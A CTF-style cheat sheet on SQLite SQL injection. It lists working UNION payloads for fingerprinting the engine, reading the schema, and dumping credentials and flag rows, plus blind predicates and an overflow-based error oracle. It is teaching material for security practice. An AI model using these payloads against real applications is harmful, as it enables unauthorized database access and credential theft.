---
title: "04 · SQLi — SQLite"
weight: 13
bookToc: true
---

# SQLite SQLi

**Flow:** `sqlite_version()` → `sqlite_schema` → CREATE TABLE SQL → actual columns → target rows.

SQLite is common in small Python/PHP CTF apps. Framework language alone is not proof of SQLite. First establish the [injection context](../sqli/).

## 1. Identify engine

Three-column UNION with second column displayed:

```sql
missing' UNION SELECT NULL,sqlite_version(),NULL-- -
```

No `DATABASE()` / `@@VERSION` / `information_schema` in ordinary SQLite. Its schema catalog is `sqlite_schema`; the older name `sqlite_master` remains widely usable.

## 2. Read the schema

Standalone fragments:

```sql
SELECT name,type,sql FROM sqlite_schema ORDER BY type,name;
SELECT name FROM sqlite_master WHERE type='table';
SELECT sql FROM sqlite_master WHERE type='table' AND name='users';
```

Complete payloads:

```sql
missing' UNION SELECT NULL,group_concat(name,','),NULL FROM sqlite_master WHERE type='table'-- -
missing' UNION SELECT NULL,group_concat(sql,char(10)),NULL FROM sqlite_master WHERE type='table'-- -
```

The `sql` field often gives the whole `CREATE TABLE`, including target column names and hidden flags such as `is_secret`. Do not stop after listing table names.

## 3. Read column metadata if needed

```sql
PRAGMA table_info('users');
SELECT name,type FROM pragma_table_info('users');
```

`PRAGMA` is a separate statement and cannot be pasted as a UNION SELECT expression. The table-valued PRAGMA form works on SQLite versions that support it:

```sql
missing' UNION SELECT NULL,group_concat(name||':'||type,','),NULL FROM pragma_table_info('users')-- -
```

If unavailable, read the `CREATE TABLE` SQL instead.

## 4. Read actual data

```sql
SELECT username,password FROM users;
SELECT flag FROM flags;
SELECT title,body FROM notes WHERE is_secret=1;
```

```sql
missing' UNION SELECT NULL,group_concat(username||':'||coalesce(password,'<NULL>'),'|'),NULL FROM users-- -
```

SQLite `||` concatenates strings. `+` normally performs numeric addition, so do not use it to join flag text. `group_concat` ignores NULL inputs. For stable pagination, use an actual unique column from the schema:

```sql
SELECT flag FROM flags ORDER BY id LIMIT 1 OFFSET 0;
SELECT flag FROM flags ORDER BY id LIMIT 1 OFFSET 1;
```

## 5. Blind predicates

```sql
length(sqlite_version())>5
EXISTS(SELECT 1 FROM sqlite_master WHERE type='table' AND name='flags')
length((SELECT flag FROM flags ORDER BY id LIMIT 1))>20
substr((SELECT flag FROM flags ORDER BY id LIMIT 1),1,1)='f'
unicode(substr((SELECT flag FROM flags ORDER BY id LIMIT 1),1,1))>109
```

`substr` is 1-indexed. `unicode` returns the first character's code point. For binary or unexpected text, inspect `hex(flag)` instead. If the subquery returns no rows, NULL comparisons are not true; first confirm existence.

## 6. Error/no-error oracle

SQLite commonly yields NULL for division by zero. This is **not** a reliable error payload:

```sql
SELECT 1/0;
```

A built-in error candidate on common builds:

```sql
1 AND CASE WHEN 1=1 THEN abs(-9223372036854775808) ELSE 1 END=1
1 AND CASE WHEN 1=2 THEN abs(-9223372036854775808) ELSE 1 END=1
```

Taking the absolute value of the minimum signed 64-bit integer raises integer overflow. Confirm the pair on the actual engine; the application's exception handler must expose a stable difference. See [blind SQLi](../sqli-blind/).

## 7. SQLite limits that save time

- There is no standard built-in `sleep()` function. Avoid copying MySQL timing payloads.
- `readfile()` / `writefile()` are usually shell/extension helpers, not standard web connection functions.
- Python `sqlite3.execute()` accepts one statement; `executescript()` has different behavior.
- Attaching a database or loading an extension is configuration/privilege dependent and unnecessary for a normal flag-row read.
- File-backed databases are often mounted beside source. A separate [LFI](../lfi-traversal/) might reveal the DB file even when SQLi is absent.

Official references: [schema table](https://www.sqlite.org/schematab.html), [core functions](https://www.sqlite.org/lang_corefunc.html), [PRAGMA](https://www.sqlite.org/pragma.html), [aggregates](https://www.sqlite.org/lang_aggfunc.html).
